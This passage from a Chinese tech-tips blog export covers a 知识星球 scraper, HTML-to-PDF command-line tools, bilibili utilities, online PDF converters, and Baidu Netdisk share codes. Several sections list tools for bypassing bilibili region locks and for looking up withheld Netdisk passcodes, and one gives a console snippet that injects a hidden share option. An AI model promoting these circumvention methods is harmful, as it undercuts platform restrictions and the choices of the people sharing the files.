#plt.imshow(wordcloud) #plt.show() plt.imshow(wordcloud, interpolation="bilinear") plt.axis("off") plt.show() wordcloud.to_file('zsxq_tool.jpg')if __name__ == '__main__': images_path = r'./images' if DOWLOAD_PICS: if os.path.exists(images_path): shutil.rmtree(images_path) os.mkdir(images_path) # 仅精华 #start_url = 'https://api.zsxq.com/v1.10/groups/481818518558/topics?scope=digests&amp;count=30' # 全部 #start_url = 'https://api.zsxq.com/v1.10/groups/481818518558/topics?count=30' start_url = '' if ONLY_DIGESTS: start_url = 'https://api.zsxq.com/v1.10/groups/' + GROUP_ID + '/topics?scope=digests&amp;count=' + str(COUNTS_PER_TIME) else: start_url = 'https://api.zsxq.com/v1.10/groups/' + GROUP_ID + '/topics?scope=all&amp;count=' + str(COUNTS_PER_TIME) url = start_url if FROM_DATE_TO_DATE and LATE_DATE.strip(): url = start_url + '&amp;end_time=' + quote(LATE_DATE.strip()) data = get_data(url) #print(data[1]) #wordimage(data[1]) #make_pdf(data[0]) if DOWLOAD_PICS and DELETE_PICS_WHEN_DONE: shutil.rmtree(images_path) 执行效果见图生成的PDF文件有点大，565页 ，50多M，主要是评论和图片都下载了，不下载的话5M差不多。 为了验证付费星球也能下载，我还建了个付费星球https://wx.zsxq.com/dweb2/index/group/224445125221，以后也会经常更新。 评论和回复也下载了 2019.6.19创建的星球Python生成的词云效果不大好，还没过滤好无用的词。 文字版也导出到TXT了。 在词云网站 http://cloud.niucodata.com/ 将下载的文字放进去就能看到词频统计和词云图。 如果你想看下载这个PDF，公众号回复 星球 获取PDF和文字版。https://pan.baidu.com/s/1pJ-nLiLLMlK08_vwoE0ZuAhttps://pan.baidu.com/s/1TcYpM4x5td2GLjkltHJhBQ wkhtmltopdf使用过程中发现wkhtmltopdf这个工具很好用 https://wkhtmltopdf.org/ 这个软件很方便在命令行生成图片和PDF，执行 wkhtmltoimage www.qq.com qq.png，就会在当前目录下生成了一张png图片。12345678910111213141516171819$ wkhtmltoimage www.qq.com qq.pngLoading page (1/2)QFont::setPixelSize: Pixel size &lt;= 0 (0) ] 44%libpng warning: iCCP: known incorrect sRGB profile ] 64%Rendering (2/2)Done $ wkhtmltopdf www.qq.com qq.pdfLoading pages (1/6)QFont::setPixelSize: Pixel size &lt;= 0 (0) ] 44%libpng warning: iCCP: known incorrect sRGB profile===&gt; ] 87%Counting pages (2/6)QFont::setPixelSize: Pixel size &lt;= 0 (0)=====================] Object 1 of 1Resolving links (4/6)Loading headers and footers (5/6)Printing pages (6/6)DoneWarning: Received createRequest signal on a disposed ResourceObject's NetworkAccessManager. This might be an indication of an iframe taking too long to load.Warning: Received createRequest signal on a disposed ResourceObject's NetworkAccessManager. This might be an indication of an iframe taking too long to load. 这个命令还可以增加一些参数，比如常用的设置宽高，图片质量等参数执行wkhtmltoimage --crop-w 410 --width 410 --quality 50 www.bing.com bing2.png看看1234567891011121314151617181920212223242526272829303132333435363738394041--crop-w 410：截图宽度410px--width 410：浏览器模拟宽度410px--quality 50：图片质量(这个值越大，图片质量越高，当然文件也会比较大)还有更多参数用法，请 wkhtmltoimage -h查看。HTML转pdf同理，wkhtmltopdf -hwkhtmltopdf -v--collate 当输出多个副本时进行校验（这是默认设置） --no-collate 当输出多个副本时不进行校验 --cookie-jar &lt;path&gt; 从提供的 JAR 文件中读写 cookie 数据 --copies &lt;number&gt; 设置输出副本的数量（默认主 1)，其实为 1 就够了-d, --dpi &lt;dpi&gt; 指定一个要分辨率（这在 X11 系统中并没有什么卵用）-H, --extended-help 相对 -h 参数，显示更详细的说明文档-g, --grayscale 指定以灰度图生成 PDF 文档。占用的空间更小-h, --help 显示帮助信息 --htmldoc 输出程序的 html 帮助文档 --image-dpi &lt;integer&gt; 当页面中有内嵌的图片时， 会下载此命令行参数指定尺寸的图片（默认值是 600) --image-quality &lt;interger&gt; 当使用 jpeg 算法压缩图片时使用这个参数指定的质量（默认为 94) --license 输出授权信息并退出-l, --lowquality 生成低质量的 PDF/PS , 能够很好的节约最终生成文档所占存储空间 --manpage 输出程序的手册页-B, --margin-bottom &lt;unitreal&gt; 设置页面的 底边距-L, --margin-left &lt;unitreal&gt; 设置页面的 左边距 （默认是 10mm)-R, --margin-right &lt;unitreal&gt; 设置页面的 右边距 （默认是 10mm)-T, --margin-top &lt;unitreal&gt; 设置页面的 上边距-O, --orientation &lt;orientation&gt; 设置为“风景 (Landscape)”或“肖像 (Portrait)”模式， 默认是肖像模块 (Portrait) --page-height &lt;unitreal&gt; 页面高度-s, --page-size &lt;Size&gt; 设置页面的尺寸，如：A4,Letter 等，默认是：A4 --page-width &lt;unitreal&gt; 页面宽度 --no-pdf-compression 不对 PDF 对象使用丢失少量信息的压缩算法，不建议使用些参数， 因为生成的 PDF 文件会非常大。-q, --quiet 静态模式，不在标准输出中打印任何信息 --read-args-from-stdin 从标准输入中读取命令行参数，后续会有针对此指令的详细介绍， 请参见 **从标准输入获取参数** --readme 输出程序的 readme 文档 --title &lt;text&gt; 生成的 PDF 文档的标题，如果不指定则使用第一个文档的标题-V, --version 输出版本信息后退出 wkhtmltopdf “/home/wang/test.html” /home/wang/test.pdf wkhtmltopdf “https://www.jd.com&quot; /home/wang/jj.pdf 中文乱码如果你是在 linux 上执行脚本可能会出现中文乱码，解决方法就是从windows拷贝宋体字体文件 c:\windos\fonts\simhei.ttf到/usr/share/fonts/下12345cd /usr/share/fonts/cp simhei.ttf .mkfontscalemkfontdirfc-cache 再次执行fc-list可以看到已经安装的字体了。 phantomjs除了wkhtmltopdf生成PDF还有phantomjs 的功能也很强大，做爬虫应用，抓取网页数据、网页截屏、页面访问自动化等。12345678910111213141516171819set_time_limit(0);$path = '/bin/phantomjs'; //phantomjs路径//$jsPath = '/home/test/phantomjs/examples/test.js'; $url = 'https://baidu.com/'; //要抓取的网页$out = 'baidu.png'; //图片保存路径$cmd = "$path --output-encoding=utf-8 $jsPath $url $out";echo $cmd;system($cmd);创建test.js```jsvar page = require('webpage').create();var args = require('system').args;var url = args[1];var filename = args[2];page.open(url, function () &#123; page.render(filename); phantom.exit();&#125;); 执行 /home/test/phantomjs/bin/phantomjs test.js http://www.baidu.com baidu.png puppeteerpuppeteer 是 chrome 提供的一个无头浏览器，它是替代 phantomjs 的一个替代品，多用于实现自动化测试。官方仓库地址：https://github.com/GoogleChrome/puppeteer,Puppeteer 能用来干啥，有哪些功能：生成页面的截图和 PDF爬取网站内容模拟登陆、自动提交表单，UI 测试，键盘输入等使用最新的 JavaScript 和浏览器功能，直接在最新版本的 Chrome 中运行测试。捕获网站的时间线跟踪，以帮助诊断性能问题测试 Chrome 扩展screenshoteer是基于Puppeteer 的命令行工具123456npm i -g screenshoteerscreenshoteer --url https://nicelinks.site/λ screenshoteer --url http://qq.comhttp://qq.comtrue腾讯首页 pdfkit这是个Python生成PDF的库12345678910&gt;&gt;&gt; import pdfkit&gt;&gt;&gt; config = pdfkit.configuration(wkhtmltopdf=r'd:\wkhtmltopdf\bin\wkhtmltopdf.exe')&gt;&gt;&gt; pdfkit.from_url('https://sogou.com', 'sogou.pdf', configuration=config)Loading pages (1/6)Counting pages (2/6)Resolving links (4/6)Loading headers and footers (5/6)Printing pages (6/6)DoneTrue 也可以将本地文件生成PDF pdfkit.from_file(‘test.html’, r’D:\test’ + id + ‘.pdf’, configuration=config) popplepdf软件 poppler https://github.com/freedesktop/poppler1234567891011121314151617181920212223$ pdfinfo 知识星球_苏生不惑.pdfTitle:Creator: wkhtmltopdf 0.12.5Producer: Qt 4.8.7CreationDate: 09/04/19 21:02:59 Tagged: noUserProperties: noSuspects: noForm: noneJavaScript: noPages: 565Encrypted: noPage size: 612 x 792 pts (letter)Page rot: 0File size: 0 bytesOptimized: noPDF version: 1.4 λ pdfpdfdetach.exe pdfimages.exe pdfseparate.exe pdftohtml.exe pdftops.exe pdfunite.exepdffonts.exe pdfinfo.exe pdftocairo.exe pdftoppm.exe pdftotext.exe 资源pdf合并工具pdftk https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/ 初识wkhtmltopdf中文字体https://github.com/sonatype/maven-guide-zh/raw/master/content-zh/src/main/resources/fonts/simsun.ttchttp://einverne.github.io/post/2019/01/html-to-pdf.html Web 屏幕截图工具使用 Laravel-snappy 生成 PDF 踩坑记录https://learnku.com/articles/25922 https://github.com/Kozea/WeasyPrint基于前端技术生成PDF方案https://juejin.im/post/5d036a78f265da1bce3dcd40 HTML转成PDF的4个方案及实现js导出图片与pdf的方案https://www.jianshu.com/p/408748cfa76e HTML 转换 PDF 解决方案抓取网页生成 PDF http://jartto.wang/2018/10/13/nodejs-pdf/ 星球导航网站https://tooltowin.com/zsxq/1124/https://www.101ker.com/p/2284 https://xiaogenhua.com/2019/05/20/caozsay/https://www.kindkp.com/ 推荐星球这段时间也加入了不少星球，推荐一个我几乎每天看的星球，为什么每天看呢，因为星主每天分享，太勤快了，星球名叫 风巢套利日享（限免），免费的https://wx.zsxq.com/dweb2/index/group/554228114224这是这个星球的词云，看到这些关键词，你心动了吗？点击阅读原文或扫码加入星球。 路人甲不安分的大门口 最后如果你也想导出哪个星球，拉我进去帮你导出来。 推荐阅读: 没有提取码怎么获取百度网盘资源？ 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些你可能用得上的简历写作工具 Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的 bilibili 奇技淫巧]]></title>
    <url>%2F2019%2F09%2F16%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84-bilibili-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[这是奇技淫巧系列第9篇文章了。 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的知乎奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 b站在国内视频网站是一股清流，一个看视频不用等60s广告的网站，今天就说说这个二次元网站的一些实用工具/技巧。 哔哩哔哩助手https://github.com/bilibili-helper/bilibili-helper 这是一个b站 辅助工具 https://bilibili-helper.github.io/ ，可以替换播放器、去广告、推送通知并进行一些快捷操作。 Chrome扩展下载链接 https://chrome.google.com/webstore/detail/%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%E5%8A%A9%E6%89%8B%EF%BC%9Abilibilicom-%E7%BB%BC%E5%90%88%E8%BE%85%E5%8A%A9%E6%89%A9%E5%B1%95/kpbnombpnpcffllnianjibmpadjolanh 比如这个视频 https://www.bilibili.com/video/av10914119 ，安装扩展登录b站后右侧有个助手按钮，可以直接下载当前播放的视频和弹幕。 更多功能可以自己设置 观看港澳台番剧有些番剧限制了港澳台才能看，比如 https://www.bilibili.com/bangumi/play/ss28049 这个会提示无法观看。 这时候就需要使用油猴了，之前写过怎么安装油猴 Chrome 浏览器扩展神器油猴 安装这个脚本 https://greasyfork.org/zh-CN/scripts/25718 ，有问题查看这里 https://github.com/ipcjs/bilibili-helper/blob/user.js/bilibili_bangumi_area_limit_hack.md 安装脚本后就可以愉快的看这个视频了，页面上有些文字也成繁体了。 ps:如果你是用的Windowns 10 ，可以在window应用市场里下载UWP版本的bilibili，就可以直接看了。 视频下载可以直接在https://www.ibilibili.com/ 输入播放地址，或者直接改为 https://www.ibilibili.com/video/av10914119 对应的还有 https://www.jijidown.com/video/av10914119 还有人开发了客户端版本下载工具，公众号回复 b站获取。 当然我更推荐使用命令行来下载那些你可能不知道的视频下载奇技淫巧1234567891011121314151617181920212223242526272829303132333435363738394041 you-get -i https://www.bilibili.com/video/av36043614site: Bilibilititle: 一个MV 周杰伦《晴天》streams: # Available quality and codecs [ DASH ] ____________________________________ - format: dash-flv720 container: mp4 quality: 高清 720P size: 80.8 MiB (84735780 bytes) # download-with: you-get --format=dash-flv720 [URL] - format: dash-flv480 container: mp4 quality: 清晰 480P size: 42.4 MiB (44437476 bytes) # download-with: you-get --format=dash-flv480 [URL] - format: dash-flv360 container: mp4 quality: 流畅 360P size: 16.3 MiB (17131306 bytes) # download-with: you-get --format=dash-flv360 [URL] [ DEFAULT ] _________________________________ - format: flv720 container: flv quality: 高清 720P size: 81.0 MiB (84952120 bytes) # download-with: you-get --format=flv720 [URL] - format: flv480 container: flv quality: 清晰 480P size: 42.6 MiB (44653816 bytes) # download-with: you-get --format=flv480 [URL] - format: flv360 container: flv quality: 流畅 360P size: 16.5 MiB (17347646 bytes) # download-with: you-get --format=flv360 [URL] B站封面提取每个视频都有封面图片，可以在 http://www.galmoe.com/ 输入 id号获取，比如 https://www.bilibili.com/video/av10914119 这个视频，输入 av10914119 获取到封面https://i2.hdslb.com/bfs/archive/6ca1b6647b4b97221ef82fec7148eee4920db8fe.png 除了网站还有对应的Chrome扩展 https://github.com/jsososo/bilibili-hand-in-the-cover TOP 100 UP 主http://rank.python666.cn/ 这里可以看到UP 主粉丝 TOP 100 榜单，papi酱 我偶尔也看看。 kanbilibili这是一个基于b站的第三方网站，bilibili 网址前面加上 kan https://www.kanbilibili.com/ ，会定期发布 日报、周刊、月刊、bilibili总榜、Up主排行榜 等数据统计报告，视频详情页提供 历史数据查看、B站视频下载、B站视频封面下载 等功能。 比如上面的视频在这里的地址就是https://www.kanbilibili.com/video/av10914119 可以看到UP主排行榜，每周五更新 https://www.kanbilibili.com/rank/ups/fans ，我关注的papi酱有537万粉丝，播放数有3个多亿。 还有视频转mp3功能，不过还是建议使用 ffmpeg 在命令行转换，可以看我之前的文章ffmpeg 将视频转GIF 粉丝在线统计比如输入papi酱 https://space.bilibili.com/1532165/ 的ID 1532165 可以看到具体的粉丝数，而不是b站上的538万。 b站观测者https://www.biliob.com 这个网站的目的是搜集并观测B站的UP主、视频或番剧等数据。 直播录制工具B站录播姬直接下载直播流，经过处理后保存到硬盘。支持自动根据文件大小或录制时长切割视频文件，支持只保存即时回放剪辑https://rec.danmuji.org/ 对应的还有直播弹幕工具 https://www.danmuji.org/ 增强脚本强大的哔哩哔哩增强脚本: 下载视频, 音乐, 封面, 弹幕 / 自定义播放器画质, 模式, 布局 / 自定义顶栏, 删除广告, 夜间模式 / 触屏设备支持https://github.com/the1812/Bilibili-Evolved，需要浏览器安装Tampermonkey插件。 各种视频相关功能有： bilibili视频编辑器bilibili视频编辑器是一款线上视频编辑工具，无需下载，直接在网页浏览器中进行操作 ，具体使用见https://www.bilibili.com/blackboard/help.html#bilibili%E8%A7%86%E9%A2%91%E7%BC%96%E8%BE%91%E5%99%A8?id=c4b1536079b04e5cbeb5a35606ea5137下载地址 https://bilibili.clipchamp.com/，需要使用b站账号登录 ，只支持Chrome浏览器。 如果文章对你有帮助，还望不吝点个在看支持下我写下去的动力。 其他小丸工具箱https://maruko.appinn.me/视频下载https://toutiao.iiilab.com/油猴脚本 解析各大视频网站VIP视频https://github.com/syhyz1990/media/https://www.biliplus.com/ 如何解除B站观看港澳台番剧 https://zhaoolee.com/ChromeAppHeroes/page/016_jie_chu_b_zhan_qu_yu_xian_zhi.html助手https://zhaoolee.com/ChromeAppHeroes/page/021_bi_li_bi_li_zhu_shou.htmlbilibili 视频下载 油猴插件https://github.com/evgo2017/bilibili_video_download强大的哔哩哔哩增强脚本https://github.com/the1812/Bilibili-Evolvedhttps://b23.tv/av58983681B站2000万用户分析https://zhuanlan.zhihu.com/p/24434456Bilibili 用户爬虫https://github.com/airingursb/bilibili-user http://ursb.me/bilibili-report/抓取了BiliBili能获取哪些数据？https://www.jianshu.com/p/1c263f39e68aBilibili 数据接口整理https://juejin.im/entry/58636c58128fe1006bc5588bPython爬取bilibili全站用户信息https://juejin.im/post/5b8fe524e51d450e531c3dcdb站视频数据播报 https://sharecuts.cn/shortcut/1068B站视频数据分析报告http://z_plus.coding.me/b站指数http://www.gsdata.cn/rank/morerank?v_type=bilibilihttps://wuyin.io/2018/03/31/bilibili-live-crawler-and-auto-edit-recording/如何免费采集哔哩哔哩视频数据http://www.houyicaiji.com/?type=post&amp;pid=3812https://github.com/AInoob/bzhuahttp://www.bilijk.tk/ A站B站数据分析实战http://www.woshipm.com/data-analysis/1622826.htmlbilibili哔哩哔哩下载助手https://chrome.google.com/webstore/detail/bilibili%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%E4%B8%8B%E8%BD%BD%E5%8A%A9%E6%89%8B/bfcbfobhcjbkilcbehlnlchiinokiijp?hl=zh-CNB站下载助手https://docs.qq.com/doc/DQ2lhaWRpS0tubVVF https://esu.wiki/Bilibili哔哩哔哩动画第三方客户端https://github.com/DaweiX/bilibili第三方哔哩哔哩API提供平台https://9bl.bakayun.cn/一个可以观看斗鱼/虎牙/熊猫/B站/全民等直播平台的第三方客户端https://www.moerats.com/archives/531/B 站自动领瓜子、直播挂机脚本 https://github.com/metowolf/BilibiliHelperhttps://docs.rsshub.app/anime.html#_005-tv扒视频、视频合并、视频转码 https://media.weibo.cn/article?object_id=1022%3A2309404296500149639994&amp;extparam=lmid–4296500152985262&amp;luicode=10000011&amp;lfid=1076033928669301&amp;id=2309404296500149639994&amp;sudaref=www.google.com.hk&amp;display=0&amp;retcode=6102 如何在YouTube和bilibili(哔哩哔哩B站)上评论图片https://sphard.com/%E5%A6%82%E4%BD%95%E5%9C%A8YouTube%E5%92%8Cbilibili(%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9B%E7%AB%99)%E4%B8%8A%E8%AF%84%E8%AE%BA%E5%9B%BE%E7%89%87%EF%BC%8C%E5%9C%A8%E8%AF%84%E8%AE%BA%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87.htmlB站视频下载 https://github.com/evgo2017/bilibili_video_downloadB 站排行https://netobs.top/B 站用户数据收集 https://github.com/cwjokaka/bilibili_member_crawlerB站最近推出了一个在线视频编辑工具，试了下，意外好用！最高可输出1080P！但目前仅支持Chrome浏览器。https://bilibili.clipchamp.com/editorb 站的倍速油猴脚本，可自定义播放速度，刷新不丢失 https://greasyfork.org/en/scripts/388225用python爬虫追踪知乎/B站大V排行 https://mp.weixin.qq.com/s/unxNMlG-TNMRbG2W1ws6swyoutube播放视频倍速自定义b 站视频封面获取 https://github.com/jsososo/bilibili-hand-in-the-cover自动搬运B博动态至微博的机器人https://github.com/smilecc/weibo-porter 推荐阅读: 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 想看的公众号文章被删了怎么办？ 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ 有意思的举牌告白小人 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的 PDF 工具]]></title>
    <url>%2F2019%2F09%2F16%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84-PDF-%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[从网上下载了PDF文件，想转换为文字或者图片怎么办，这里分享些常用的PDF制作工具。 smallpdf功能一应俱全、简单好用的线上 PDF 工具 https://smallpdf.com/cn/ ppt PDF互转，pdf Excel互转什么的都有。它还提供了Chrome扩展 https://zhaoolee.com/ChromeAppHeroes/page/032_smallpdf.html pdf24免费且易于使用的在线PDF工具 https://tools.pdf24.org/zh/ PDF压缩合并编辑转换都有。 ilovepdf 完全免费的PDF文件在线管理工具，其功能包括：合并PDF文件、拆分PDF文件、压缩PDF文件、Office文件转换为PDF文件、PDF文件转换为JPG图片、JPG图片转换为PDF文件，无需安装。https://www.ilovepdf.com/zh-cn，对应的还有图片处理的https://www.iloveimg.com/ docsmall由 INTERVAL DESIGN 设计开发的在线文件处理工具，无需下载软件，通过云端服务上传、处理、下载简单三步即可完成操作，目前已上线图片压缩、PDF压缩、PDF合并、PDF分割功能https://docsmall.com/ alltoall免费的在线格式转换工具,支持200+格式的文件在线转换，且完全免费。http://www.alltoall.net/document-pdf/ ###PickFrom一应俱全，简单便捷的在线工具 https://zh.pickfrom.net/ 将公众号文章转PDF，预览效果 https://zh.pickfrom.net/weixin2pdf ###hipdf一站式在线PDF解决方案https://www.hipdf.cn/ pdf.iohttps://pdf.io/tw/ 这个界面只有繁体中文，不过功能一样的。 PDF派好用的PDF在线工具，完全免费https://www.pdfpai.com/ 第三方网站有些第三方网站集成了这些工具，比如 http://www.nicetool.net/ 搜索pdf第一个PDF转图片 http://www.nicetool.net/app/pdf2image.html 每张PPT转为一张图片，效果如图。类似的还有http://www.gjw123.com/search.html?query=pdf https://www.toolnb.com/ 我试了下效果不错。 Office2PDF转换选定目录下所有doc/docx/ppt/pptx到PDF, 需要安装有Office 2010或Office2013, 直接运行Office2PDF.ahk即可, 会保留原始目录结构。下载地址https://github.com/icylogic/Office2PDF/releases/download/0.1/Office2PDF.exe 类似的还有https://github.com/cxgreat2014/VBScript_DOC2PDF https://github.com/JasonKhew96/Docs2Pdf wkhtmltopdf这是一个非常好用的HTML转PDF的命令行工具，之前的文章Python 抓取知识星球内容生成词云和 PDF 就是用的这个。https://wkhtmltopdf.org/downloads.html命令行执行 wkhtmltopdf http://google.com google.pdf就能将Google的网页生成PDFpython 有基于wkhtmltopdf的模块pdfkit，很方便在程序中转换HTML为PDF。12345678910111213141516&gt;&gt;&gt; import pdfkit&gt;&gt;&gt; config=pdfkit.configuration(wkhtmltopdf=r'd:\wkhtmltopdf\bin\wkhtmltopdf.exe')&gt;&gt;&gt; pdfkit.from_url('http://qq.com','qq.pdf',configuration=config)Loading pages (1/6)QFont::setPixelSize: Pixel size &lt;= 0 (0) ] 43%Counting pages (2/6)QFont::setPixelSize: Pixel size &lt;= 0 (0)=====================] Object 1 of 1Resolving links (4/6)Loading headers and footers (5/6)Printing pages (6/6)DoneWarning: Received createRequest signal on a disposed ResourceObject's NetworkAccessManager. This might be an indication of an iframe taking too long to load.Warning: Received createRequest signal on a disposed ResourceObject's NetworkAccessManager. This might be an indication of an iframe taking too long to load.Warning: Received createRequest signal on a disposed ResourceObject's NetworkAccessManager. This might be an indication of an iframe taking too long to load.True 如果文章对你有所帮助，还望不吝在看分享，感谢。 其他PDF水印清理专家 http://www.liyusoft.com/pdfwr 一款免费的线上PDF转换器https://www.pdfyeah.com/累死累活干不过做 PPT 的 https://github.com/ksky521/nodeppt https://nodeppt.js.org/#slide=5https://pdf2doc.com/zh/吾爱破解论坛 爱盘 down.52pojie.cn 页面的源代码 https://github.com/ganlvtech/down_52pojie_cnhttps://github.com/icylogic/Office2PDFLaravel HTML 导出 PDF 方案 —– wkhtmltopdf Laravel-snappyhttps://laravel-china.org/articles/20450http://www.pdfdo.com/http://www.pdfbao.com/https://pdf.io/tw/ https://zhuanlan.zhihu.com/p/21538584得力PDF转换器 http://www.pdf2word.cn/ 十七款PDF在线处理转换器https://m.weibo.cn/status/4395383201418956初识wkhtmltopdf https://segmentfault.com/a/1190000018765575将您的图片转换成多种图片格式。JPG, PNG, GIF, BMP, TIFF, ICO, SVG和更多图片格式 https://jinaconvert.com/cn/pdf 转 word 工具 https://www.pdfpai.com/https://www.aconvert.com/cn/pdf/http://edit.foxitcloud.cn/命令行就可以把网页保存成 PDF 文件 https://github.com/danburzo/percollatehttps://www.extractpdf.com/一个可以将 pdf 中的图片全部提取出来并打包下载的一个工具，还可以看到文档中纯文字部分一个能完美的将网页导出到PDF的在线服务，可使用其提供的API，在你的在线简历页面添加一个PDF导出按钮。地址https://www.sejda.com/html-to-pdfhttp://tools.bugscaner.com/webmaster/https://www.extractpdf.com/一个可以将 pdf 中的图片全部提取出来并打包下载的一个工具，还可以看到文档中纯文字部分一个能完美的将网页导出到PDF的在线服务，可使用其提供的API，在你的在线简历页面添加一个PDF导出按钮。地址https://www.sejda.com/html-to-pdf https://github.com/Nihiue/ilovepdf-node https://github.com/Nihiue/libreoffice-portal pdf to ppt https://github.com/TomAnthony/pdf-to-powerpoint需要安装 http://blog.alivate.com.au/poppler-windows/ 加入环境变量 pdftotext file.pdf - | grep string 123456789101112131415161718192021222324252627282930$ python convert.py wechat_article.pdfConverting file: wechat_article.pdfStarting conversion......complete.Saving slide: 0Saving file: wechat_article.pptxConversion complete. :)$ pdfinfo.exe wechat_article.pdfTitle:Creator: wkhtmltopdf 0.12.5Producer: Qt 4.8.7CreationDate: 07/01/19 20:22:41 ▒й▒▒▒׼ʱ▒▒Tagged: noUserProperties: noSuspects: noForm: noneJavaScript: noPages: 5Encrypted: noPage size: 595 x 842 pts (A4)Page rot: 0File size: 117566 bytesOptimized: noPDF version: 1.4https://github.com/ernestyao/PPT2PDF http://blog.51yip.com/other/1934.htmlhttps://wkhtmltopdf.org/downloads.html 推荐阅读: 如何发一条空白的朋友圈 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[没有提取码怎么获取百度网盘资源？]]></title>
    <url>%2F2019%2F09%2F16%2F%E6%B2%A1%E6%9C%89%E6%8F%90%E5%8F%96%E7%A0%81%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E8%B5%84%E6%BA%90%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[之前已经写过那些你可能不知道的百度文库/网盘快速下载工具，这次再来说说提取码，分享网盘资源默认是必须要设置提取码的，如果不想设置怎么办呢？ 无提取码加上一段代码就可以不需要提取码了，按F12在控制台输入以下代码：1$(".share-method-line").parent().append('&lt;div class="share-method-line"&gt;&lt;input type="radio" id="share-method-public" name="share-method" value="public" checked=""&gt;&lt;span class="icon radio-icon icon-radio-non"&gt;&lt;/span&gt;&lt;label for="share-method-public"&gt;&lt;b&gt;公开分享&lt;/b&gt;&lt;span&gt;任何人访问链接即可查看，下载！&lt;/span&gt; 来自&lt;a href="http://mp.weixin.qq.com/mp/homepage?__biz=MzIyMjg2ODExMA==&amp;hid=1&amp;sn=e7478e21fb95dd2d2b39b7d00c344da8&amp;scene=18#wechat_redirect"&gt;苏生不惑&lt;/a&gt;&lt;/label&gt;&lt;/div&gt;') 这样就可以看到公开分享了，直接生成链接https://pan.baidu.com/s/12gIg-IN18uOUferhFs6-2A，不需要提取码就能打开。 当然大多数人不知道这个，所以分享的资源都有提取码，有时候在网上找电影，有人发了个网盘链接，但是没有给提取码，要加微信付费来获取提取码，真的很不爽，不知道提取码怎么能获取到网盘资源呢？下面分享几个工具。 爱搜资源助手这个一个Chrome扩展，关于Chrome扩展之前已经写过Chrome 浏览器扩展神器油猴Chrome 浏览器扩展神器暴力猴网站 https://www.aisouziyuan.com/,安装完后的效果：比如https://pan.baidu.com/s/1QcxFPwF7WxkI4eD6c-PFBw 这个网盘链接有提取码，不知道的话没法进去。安装扩展后会自动填写提取码进入。 当然这个不是百分之百能获取到提取码的。 而且这个还支持微云的分享密码。 油猴脚本百度网盘超级助手https://greasyfork.org/zh-CN/scripts/389566这个油猴脚本支持提取码自动填写、pandownload资源全速下载、链接状态自动判断。安装后打开网盘链接会自动搜索填写提取码。 云盘万能钥匙这也是个Chrome扩展，网站 http://ypsuperkey.meek.com.cn/效果和上面的差不多 如果你不想安装扩展，有人还基于云盘万能钥匙API的开发了在线查询工具 https://pnote.net/pan/ 当然还有人开发了桌面版软件https://pan.baidu.com/s/1LZx_7bvTwxA5U8i6ILlPfw 其他网盘接口查询百度网盘提取密码https://github.com/wu-dada/baidupankey百度云盘万能钥匙http://tools.bugscaner.com/baiduyunpassword/百度网盘提取码在线查询https://pan.09l.me/pwd万能云精灵https://bbs.pediy.com/thread-226701.htmhttps://hao.su/1717/网盘万能钥匙https://go2think.com/wp-key-auto-fill/ 百度网盘提取码自动识别 https://pan.baiduwp.com/s/1PVrRkX1K3mQMXnnTEgJGxQ?pwd=ju2b网盘搜索百度网盘直链下载助手https://github.com/syhyz1990/baiduyun/谷歌助手 https://www.macdown.com/mac/2441.html百度网盘提取码查询的软件https://www.tenlonstudio.com/4435.html是时候舍弃百度网盘客户端了，拥抱aria2免登陆不限速下载百度云资源了 https://www.jianshu.com/p/0981af1413cf满速下载百度云神器https://www.jianshu.com/p/97f314af6d79百度云提取码破解https://greasyfork.org/zh-CN/scripts/380664百度云盘提取码小工具https://www.yudouyudou.com/ziyuanxiazai/gongjuchajian/1555.html 查询百度网盘提取码https://www.52pojie.cn/thread-920211-1-1.html推荐阅读: 想看的公众号文章被删了怎么办？ 如何发一条空白的朋友圈 有意思的举牌告白小人 如何在电脑上登陆多个微信 如何提取公积金 9 天到账 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 那些你可能用得上的简历写作工具 Chrome 浏览器扩展神器油猴 我的新浪工作日常 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[怕被发垃圾邮件？用临时邮箱来注册账号]]></title>
